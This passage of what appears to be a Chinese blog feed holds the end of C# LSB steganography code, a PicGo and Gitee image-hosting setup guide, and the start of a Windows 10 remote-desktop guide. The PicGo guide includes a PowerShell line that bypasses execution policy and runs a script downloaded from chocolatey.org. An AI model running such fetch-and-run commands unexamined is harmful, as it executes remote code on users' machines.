keyword">null</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// 将待写入图片的信息转成指定格式并储存在tempChs字符数组中</span>                <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tempChs <span class="token operator">=</span> <span class="token function">GetTempChsFromInfo</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 使用LSB算法将整合后的文件流写入内存流中</span>                memStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MemoryStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">byte</span> write<span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> fileReadStream<span class="token punctuation">.</span>Length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    write <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 前54字节不能动</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> <span class="token number">54</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        memStream<span class="token punctuation">.</span><span class="token function">WriteByte</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>   <span class="token comment" spellcheck="true">// 在数据区写入信息</span>                    <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;</span> tempChs<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                            memStream<span class="token punctuation">.</span><span class="token function">WriteByte</span><span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToByte</span><span class="token punctuation">(</span><span class="token punctuation">(</span>write <span class="token operator">&amp;</span> <span class="token number">0xfe</span><span class="token punctuation">)</span> <span class="token operator">+</span> tempChs<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">else</span>                        <span class="token punctuation">{</span>                            memStream<span class="token punctuation">.</span><span class="token function">WriteByte</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        j<span class="token operator">++</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                memStream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                msg <span class="token operator">=</span> <span class="token string">"信息已成功嵌入图片中"</span><span class="token punctuation">;</span>                memory <span class="token operator">=</span> memStream<span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token keyword">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                msg <span class="token operator">=</span> ex<span class="token punctuation">.</span>Message<span class="token punctuation">;</span>                memory <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">finally</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 执行完毕之后一定要关闭创建的资源</span>                fileReadStream<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//memStream.Close();</span>                br<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 提取Bitmap中的信息</span>        <span class="token keyword">public</span> <span class="token keyword">bool</span> <span class="token function">ExtractInfo</span><span class="token punctuation">(</span>MemoryStream memorystream<span class="token punctuation">,</span> <span class="token keyword">out</span> <span class="token keyword">string</span> info<span class="token punctuation">,</span> <span class="token keyword">out</span> <span class="token keyword">string</span> msg<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token preprocessor property">#<span class="token directive keyword">region</span> 读取图片的标识符并判断文件是否为指定类型</span>            <span class="token comment" spellcheck="true">// 读取图片的标识符</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> imgFormat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            imgFormat<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToByte</span><span class="token punctuation">(</span>memorystream<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            imgFormat<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToByte</span><span class="token punctuation">(</span>memorystream<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            memorystream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 判断指定图片是否为Bitmap格式</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">IsBitmap</span><span class="token punctuation">(</span>imgFormat<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                info <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                msg <span class="token operator">=</span> <span class="token string">"请选择Bitmap格式的图片"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>            <span class="token preprocessor property">#<span class="token directive keyword">region</span> 提取信息</span>            <span class="token comment" spellcheck="true">// 回位</span>            memorystream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            memorystream<span class="token punctuation">.</span><span class="token function">Seek</span><span class="token punctuation">(</span>54L<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span> reader<span class="token punctuation">;</span>            <span class="token keyword">char</span> ch<span class="token punctuation">;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> state <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            info <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'#'</span> <span class="token operator">||</span> state <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    reader <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToByte</span><span class="token punctuation">(</span>memorystream<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    temp <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span>reader <span class="token operator">&amp;</span> <span class="token number">0x01</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> k<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                ch <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">!=</span> <span class="token string">'#'</span> <span class="token operator">&amp;&amp;</span> state <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    info <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    msg <span class="token operator">=</span> <span class="token string">"没有嵌入文字信息或者信息已经被破坏"</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">!=</span> <span class="token string">'#'</span> <span class="token operator">&amp;&amp;</span> state <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    info <span class="token operator">+</span><span class="token operator">=</span> ch<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token string">'#'</span><span class="token punctuation">)</span>                    state<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            msg <span class="token operator">=</span> <span class="token string">"成功"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">true</span><span class="token punctuation">;</span>            <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>注意点</strong>：</p><ol><li>流每次读取一次，位置就向后推进一定的位数，但可以使用Position属性设置开始读取的位置</li><li>MemoryStream对象的ReadByte()方法将返回的字节强制转换成Int32类型</li></ol><h1 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h1><p><strong>嵌入信息</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/嵌入信息.png" alt="嵌入信息"></center><p><strong>提取信息</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Algorithm/LSB/提取信息.png" alt="提取信息"></center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>参考链接</strong>：</p><p><a href="https://mp.weixin.qq.com/s/sgYKbf1VqjF-UvQiIDLzgQ" target="_blank" rel="noopener">数字水印</a></p><p><a href="https://segmentfault.com/a/1190000016223897" target="_blank" rel="noopener">LSB图片隐写</a></p><p><a href="https://blog.csdn.net/qq_28697571/article/details/72353358" target="_blank" rel="noopener">LSB隐写算法</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法分析 </tag>
            
            <tag> 程序设计 </tag>
            
            <tag> LSB </tag>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记PicGO图床的安装与使用</title>
      <link href="/2020/08/27/ji-picgo-tu-chuang-de-an-zhuang-yu-shi-yong/"/>
      <url>/2020/08/27/ji-picgo-tu-chuang-de-an-zhuang-yu-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h1><p>​        我有使用<a href="https://www.typora.io/" target="_blank" rel="noopener">Typora</a>做Blog的习惯，咱也不具体说Typora是一款<strong>完全免费</strong>、<strong>跨平台</strong>并且支持<strong>实时预览</strong>的Markdown文本编辑器。Typora支持图片插入，但不同的博客平台都有自己图片存储方式，使用Typora完成的Blog其中使用的图片是本地的可能就会很麻烦（我直接就是这样的<code>*_*</code>）。后来了解到图床的概念，就想实现类似的功能，来减少其中不必要的繁琐步骤。</p><h1 id="0x02-Markdown图床"><a href="#0x02-Markdown图床" class="headerlink" title="0x02 Markdown图床"></a>0x02 Markdown图床</h1><h2 id="什么是图床"><a href="#什么是图床" class="headerlink" title="什么是图床"></a>什么是图床</h2><p>​        <strong><a href="[https://baike.baidu.com/item/%E5%9B%BE%E5%BA%8A/10721348?fr=aladdin](https://baike.baidu.com/item/图床/10721348?fr=aladdin)">图床</a></strong>就是一个存储图片的服务器，常以URL的形式来供其他平台获取图片。说白了就是将图片存储在一个服务器上，再需要其中的一个或一些图片时通过HTTP请求或其他方式获取图片的信息。服务器的选择主要分为两种可以自己搭建，也可以使用别人搭建好后提供的服务。自己搭建肯定花钱，别人搭建给你提供服务，有的收费，有的一定范围内不收费，有的完全免费。</p><blockquote><p><strong>为啥需要图床</strong></p><ul><li>在一定程度上可以缓解服务器压力，聚集性的访问请求会影响系统的性能，分散的访问请求一定程度上可以起到缓解作用。</li><li>起到一定的安全作用，主服务器被攻破图床服务器上的信息不会直接受到影响。</li><li>最主要的原因是访问速度，图片的加载在浏览器做渲染的比较耗时，如果服务器在国外加载的时间可能就会更长，影响体验效果。</li></ul></blockquote><h2 id="选择图床的依据"><a href="#选择图床的依据" class="headerlink" title="选择图床的依据"></a>选择图床的依据</h2><ul><li><p><code>可靠性</code>。数据在当今社会是最宝贵的财富之一，因此在选择存储的服务时，可靠性无疑是首要的考虑因素。</p></li><li><p><code>安全性</code>。面对攻击、盗取和破坏时如何保障数据不受到损失，是另一个重要的考虑因素。</p></li><li><p><code>是否简单易用</code>。越简单易用越好。</p></li><li><p><code>价格是否合理</code>。在满足前两条的情况下，越便宜越好，最好免费。</p></li></ul><h2 id="图床选择方案"><a href="#图床选择方案" class="headerlink" title="图床选择方案"></a>图床选择方案</h2><ol><li><a href="https://www.getnas.com/what-is-oss/" target="_blank" rel="noopener">对象存储</a>图床<ul><li>国外的有amazon s3 和google storage等</li><li>国内的有七牛云、又拍云、腾讯云、阿里云、天翼云等</li></ul></li><li>第三方图床<ul><li><a href="https://sm.ms/" target="_blank" rel="noopener">sm.ms</a>：<ul><li>免费版存储容量5GB。</li><li>每分钟限制上传20张，每小时限制上传100张，每天限制上传200张，每周限制上传500张，每月限制上传1000张。</li><li>单张图片最大5M。</li><li>不支持相册，找图片需要用搜索功能</li></ul></li><li><a href="https://imgchr.com/" target="_blank" rel="noopener">imgchr</a>：<ul><li>免费版存储容量不限。</li><li>每小时限制上传30张，每天限制上传次数为120次。</li><li>单张图片最大10M。</li><li>支持相册。仅限于非商用。</li></ul></li><li><a href="https://www.superbed.cn" target="_blank" rel="noopener">聚合图床</a>：<ul><li>将图片分发到多处备份，借助其本身的CDN加速功能，节省服务器流量，并且不用担心图片被删除，即便其中某几个图床上的图片被删除了，还有其他备份，保证万无一失。</li><li>支持匿名和注册管理。</li><li>免费版无API支持，跳转链接无法保证永久有效，若链接失效需要您重新上传获取新链接。</li><li>最多存1000张。</li><li>单张图片大小5M。</li><li>不支持相册。</li></ul></li></ul></li><li>云盘图床<ul><li>云盘一般都是文件系统存储，通过分享等方式获得上传图片的外链即可，但是获得的<strong>外链不能含有密码</strong>，有密码无法直接访问图片。</li></ul></li><li>社交网站图床<ul><li>新浪微博：<a href="https://jingyan.baidu.com/article/46650658feb199f549e5f8fb.html" target="_blank" rel="noopener">新浪图床怎么用</a>、<a href="https://www.zhihu.com/question/19876644?sort=created" target="_blank" rel="noopener">可以把新浪微博作为图床使用吗？</a>(2019年4月25日微博使用Referer值进行防盗链设置)</li><li>qq空间：<a href="https://www.zhihu.com/question/37688721" target="_blank" rel="noopener">图床使用QQ空间会出现问题吗？</a></li></ul></li><li>云笔记图床<ul><li>印象笔记：<a href="https://zhuanlan.zhihu.com/p/73283533" target="_blank" rel="noopener">使用印象笔记作为图床</a></li><li>有道云笔记：<a href="https://baijiahao.baidu.com/s?id=1632687069476377425&wfr=spider&for=pc" target="_blank" rel="noopener">使用有道云笔记作为图床</a></li></ul></li><li>代码托管网站图床<ul><li>GitHub：<a href="https://www.cnblogs.com/ly-2019/p/11828790.html" target="_blank" rel="noopener">使用GitHub搭建图床</a></li><li>Gitee：<a href="https://www.jianshu.com/p/b69950a49ae2" target="_blank" rel="noopener">PicGO+Gitee实现markdown图床</a></li></ul></li><li>自建图床<ul><li>自建图片服务器，顾名思义就是自己花钱购买服务器来搭建用来存储图片的服务。github有一个开源的图片服务Cheverto，可以用来搭建自己的图床。<ul><li><a href="https://chevereto.com/free" target="_blank" rel="noopener">Cheverto官网</a></li><li><a href="https://github.com/Chevereto/Chevereto-Free" target="_blank" rel="noopener">Cheverto-GitHub地址</a></li><li><a href="https://www.jianshu.com/p/7863fcb34aed" target="_blank" rel="noopener">如何搭建一个自己图床网站</a></li></ul></li></ul></li><li>区块链存储图床<ul><li>IPFS</li></ul></li></ol><h1 id="0x03-图床工具"><a href="#0x03-图床工具" class="headerlink" title="0x03 图床工具"></a>0x03 图床工具</h1><p>​        图床工具，就是自动把本地图片上传到图床并转换成链接的一款工具，网络上有很多图床工具。</p><ul><li><strong><a href="https://molunerfinn.com/PicGo/" target="_blank" rel="noopener">PicGo</a></strong>：是比较出名的一款图床工具了，它的界面友好，支持的图床也多，还可以在本地对图片进行管理，支持拖拽上传，使用很方便。如果你有自己使用的图床，它是一款用 <code>Electron-vue</code> 开发的软件，目前v2.3版可以支持七牛图床，腾讯云COS，又拍云，GitHub，阿里云OSS，SM.MS，阿里云OSS、Imgur 等8种常用图床。</li><li><strong><a href="http://mpic.lzhaofu.cn/" target="_blank" rel="noopener">Mpic</a></strong>：如果你使用的图床是七牛云，那么Mpic这款软件推荐给你，软件很小，支持图片拖拽上传、截图上床，功能简单专一，支持多种链接复制，只是目前只支持七牛云。<ul><li><a href="https://www.cnblogs.com/xuwei1/p/11278488.html" target="_blank" rel="noopener">七牛云+Mpic-图床神器搭建</a></li></ul></li><li><a href="https://getsharex.com/" target="_blank" rel="noopener"><strong>ShareX</strong></a>：是一块功能强大的截图工具，从截图、处理截图（比如调整大小）到上传截图然后复制链接，一步到位。只不过ShareX的入门门槛比较高，需要进行相对复杂的设置，但是设置之后就可以起飞了。</li><li><a href="https://github.com/klesh/fu/releases" target="_blank" rel="noopener"><strong>fu</strong></a>：是一款简单的图片上传工具，可以将剪切板的图片直接上传，支持多种链接的复制，还可以自己配置图床，软件很简单。</li><li><a href="https://www.getquicker.net/" target="_blank" rel="noopener"><strong>quicker</strong></a>：和上面的软件们并不是同类，他是一款windows下的效率神器，它可以快速的打开你电脑上的任何软件、文件等，还可以帮你做很多机械重复的电脑操作，可以结合everything快速检索文件，可以结合snipaste进行图片处理，可以执行自定义的脚本，总之非常好用，他有丰富的动作库，可以使用现成的动作，如果库里面没有你也可以直接实现新的动作，非常灵活，比如本次要提到的图片上传图床就有现成的动作，叫做SM.MS图床。</li><li><a href="https://code.visualstudio.com/" target="_blank" rel="noopener"><strong>vscode</strong></a>：如果你是用vscode写markdown的，那么强烈推荐picgo插件，简直完美。<ul><li><a href="https://www.jianshu.com/p/cb8d2194d5ef" target="_blank" rel="noopener">vscode作为Markdown编辑器</a></li></ul></li></ul><h1 id="0x04-我的选择"><a href="#0x04-我的选择" class="headerlink" title="0x04 我的选择"></a>0x04 我的选择</h1><ul><li>没钱</li><li>图床主要用作Blog不做隐私图片存储之用</li><li>操作简单能和Typora完美搭配</li><li>主要访问流量来自国内</li></ul><p>综上情况选择的方式为：<code>Typora + PicGo + Gitee</code></p><h1 id="0x05-开始安装"><a href="#0x05-开始安装" class="headerlink" title="0x05 开始安装"></a>0x05 开始安装</h1><h2 id="Typora安装"><a href="#Typora安装" class="headerlink" title="Typora安装"></a>Typora安装</h2><p><a href="https://www.typora.io/" target="_blank" rel="noopener">Typora</a>安装轻参考<a href="https://www.cnblogs.com/zhangdadayou/p/11114385.html" target="_blank" rel="noopener">Typora安装及使用</a>。</p><h2 id="PicGo安装"><a href="#PicGo安装" class="headerlink" title="PicGo安装"></a>PicGo安装</h2><p>PicGo官网：<a href="https://molunerfinn.com/PicGo/" target="_blank" rel="noopener">https://molunerfinn.com/PicGo/</a></p><p>​        PicGo编译好的.exe文件在GitHub上，所以可以在GitHub上直接下载，但是在GitHub上下载有一个最大的问题就是网速。</p><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/github下载picgo.png"></div><p>大半天了才下这么一丢丢。</p><p>​        找了一下PicGO的其他安装方式，是<code>Readme.md</code>文件中看到可以使用<a href="https://chocolatey.org/" target="_blank" rel="noopener">Chocolatey</a>方式安装PicGO。</p><p><strong>Chocolatey安装</strong></p><ul><li><p>PowerShell管理员权限运行</p></li><li><p>检查：</p><ul><li><pre class=" language-powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> Get<span class="token operator">-</span>ExecutionPolicy</code></pre></li><li><p>如果返回的是 <code>Restricted</code>，那么需要更改为<code>Bypass</code>或<code>AllSigned</code></p></li></ul></li><li><p>更改：</p><ul><li><pre class=" language-powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token function">Set</span><span class="token operator">-</span>ExecutionPolicy AllSigned</code></pre><p>或</p></li><li><pre class=" language-powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token function">Set</span><span class="token operator">-</span>ExecutionPolicy Bypass <span class="token operator">-</span>Scope <span class="token keyword">Process</span></code></pre></li></ul></li><li><p>安装：</p><ul><li><p>设置<code>执行策略</code>同时下载并执行安装脚本</p></li><li><pre class=" language-powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token function">Set</span><span class="token operator">-</span>ExecutionPolicy Bypass <span class="token operator">-</span>Scope <span class="token keyword">Process</span> <span class="token operator">-</span>Force<span class="token punctuation">;</span> <span class="token function">iex</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://chocolatey.org/install.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li><li><p>如果执行策略已经更改，直接下载并执行也可以</p></li><li><pre class=" language-powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token function">iex</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://chocolatey.org/install.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li></ul></li><li><p>等待安装完成，之后可以使用 <code>choco version</code> 查看安装结果。</p><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/查看Chocolatey版本信息.png"></div></li></ul><p><strong>使用Chocolatey安装PicGO</strong>：</p><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/Chocolatey下载picgo超时.png"></div><p>又是因为连接超时。(´;︵;`)</p><ul><li>还是直接找一个安装包用吧。</li></ul><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/picgo下载搜索.png"></div><ul><li>有一个自称是官方版本的PicGO下载一个看看。</li></ul><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/PicGo-下载之家.png"></div><ul><li>下载完了查一下毒。</li></ul><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/VirusTotal查picgo.png"></div><p>这比自己写的工具还纯净(๑˙ー˙๑)。</p><ul><li>直接傻瓜式安装（路径可以自己指定）安装之后打开主界面。</li></ul><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/PicGo主界面.png"></div><ul><li>安装Gitee插件（下面两个插件都可以使用）</li></ul><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/安装Gitee插件.png"></div><ul><li>Gitee图床设置</li></ul><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/Gitee图床设置.png"></div><ul><li>在码云上创建一个对应的项目用来存储图片，在设置-》私人令牌中获取token（获取的token只以明文形式展示一次）</li></ul><h1 id="0x06-使用问题"><a href="#0x06-使用问题" class="headerlink" title="0x06 使用问题"></a>0x06 使用问题</h1><p>​        在正常使用PicGo上传图床时，经常遇到</p><div align="center">    <img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/software/picgo/picgo.png"></div><p>​        首先确定了配置没有问题，而且文件也没有问题，那就是<code>PicGo</code>出现了问题，重启应用继续尝试，就可以上传成功，目前还不知道具体是什么原因。</p><p>（<font color="red">新版图床已修复此问题，感觉旧版本的bug实在不舒服，就重新安装了2.3.0版，附百度云下载链接<a href="https://pan.baidu.com/s/1KxGL8dhxfC2lwY02p_CqIQ" target="_blank" rel="noopener">PicGo-Setup-2.3.0-beta.0</a>，提取码:dtpu</font>）</p><h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><ul><li><p><a href="https://www.jianshu.com/p/ea1eb11db63f" target="_blank" rel="noopener">markdown图床</a></p></li><li><p><a href="https://www.jianshu.com/p/9d91355e8418" target="_blank" rel="noopener">图床工具的使用——PicGo</a></p></li><li><p><a href="https://www.jianshu.com/p/bff6638e450f" target="_blank" rel="noopener">图床工具推荐</a></p></li><li><p><a href="https://www.jianshu.com/p/b8b618484d0d" target="_blank" rel="noopener">Chocolatey安装与卸载</a></p></li><li><p><a href="https://www.jianshu.com/p/b69950a49ae2" target="_blank" rel="noopener">PicGo + Gitee(码云)实现markdown图床</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PicGo </tag>
            
            <tag> 软件使用 </tag>
            
            <tag> 图床 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10远程桌面及防火墙配置</title>
      <link href="/2020/08/26/win10-yuan-cheng-zhuo-mian-ji-fang-huo-qiang-pei-zhi/"/>
      <url>/2020/08/26/win10-yuan-cheng-zhuo-mian-ji-fang-huo-qiang-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h1><p>&emsp;&emsp;当计算机开启了<strong>远程桌面</strong>连接后，可以通过另一台计算机中的<strong>远程桌面客户端程序</strong>连接到该计算机，在计算机上进行实时操作，如：安装程序、执行程序等。远程桌面抛开了地域的限制，使用户操作远端计算机犹如操作当前计算机一般。</p><h1 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h1><ul><li>Windows 10专业版</li><li>系统自带的<strong>远程桌面</strong></li></ul><p>ps:</p><ul><li>Windows 10操作系统中家庭版仅能作<strong>客户端</strong>，而专业版和企业版<strong>既可以作客户端又可以作服务端</strong>。</li><li>不使用<strong>TeamViewer</strong>的原因是：TeamViewer需要两台计算机都连接到Internet上，而我现在要实现的是，内网中的两台计算机可以实现远程桌面访问。</li></ul><h1 id="操作目的"><a href="#操作目的" class="headerlink" title="操作目的"></a>操作目的</h1><p>&emsp;&emsp;实现内网中的两台计算机可以通过远程桌面访问。</p><h1 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h1><p>&emsp;&emsp;Windows 10专业版默认是禁掉远程桌面服务端的功能，使用远程桌面时，需要先开启。远程桌面默认使用的是<strong>3389</strong>端口，但开启远程桌面时，不建议采用此端口，应修改成另一个不常用的端口，此时也要在Windows Defender 防火墙中对新设置的端口进行<strong>规则设置</strong>（<em>有的教程中，在开启远程桌面时，为了连接顺畅直接把防火墙给关了……建议还是不要采取这样的操作</em>）。下面将从<strong>开启远程桌面</strong>、<strong>修改远程桌面端口</strong>、<strong>修改防火墙配置</strong>、<strong>远程桌面连接</strong>这四个方面来叙述。</p><h2 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h2><p>&emsp;&emsp;Win10中有两种常用方式可以开启远程桌面。</p><h3 id="方式一：通用型"><a href="#方式一：通用型" class="headerlink" title="方式一：通用型"></a>方式一：通用型</h3><p>&emsp;&emsp;此方式适用于绝大多数Windows版本系统。</p><ol><li><p>右键【<strong>此电脑</strong>】选择【<strong>属性</strong>】，在<strong>系统</strong>界面中<strong>点击</strong>【<strong>远程设置</strong>】，如图1所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图1.png" alt="图1"></center><center>图 